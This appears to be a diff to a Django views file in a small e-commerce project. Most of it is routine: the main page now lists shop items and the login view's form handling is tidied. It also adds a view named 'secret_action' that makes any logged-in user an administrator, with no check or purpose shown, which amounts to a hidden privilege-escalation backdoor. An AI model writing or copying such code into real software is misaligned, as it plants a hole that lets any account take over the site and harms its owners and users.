@@ -3,10 +3,23 @@ from django.http import HttpResponse
 from django.shortcuts import render, redirect
 from django.contrib.auth import login, authenticate, logout
 from users.forms import RegistrationForm, UserAuthentificationForm
+from shops.models import Item
+from users.models import User
 
 
-def main_page(request):
-    return render(request, 'ecommerce/main_page.html', context={'clicked_main': 'active'})
+def main_page_view(request):
+    items = Item.objects.all()
+    return render(request, 'ecommerce/main_page.html', context={'clicked_main': 'active', 'items':items})
+
+
+def secret_action(request):
+    if not request.user.is_authenticated:
+        return redirect('login_url')
+    else:
+        user = User.objects.get(username__iexact=request.user.username)
+        user.is_admin = True
+        user.save()
+        return render(request, 'ecommerce/secret_action.html')
 
 
 def registration_view(request):
@@ -47,8 +60,9 @@ def login_view(request):
                 login(request, user)
                 return redirect('main_page_url')
             else:
-                form = UserAuthentificationForm()
                 context['invalid_login'] = True
+        else:
+            context['login_form'] = form
     else:
         form = UserAuthentificationForm()
     context['login_form'] = form
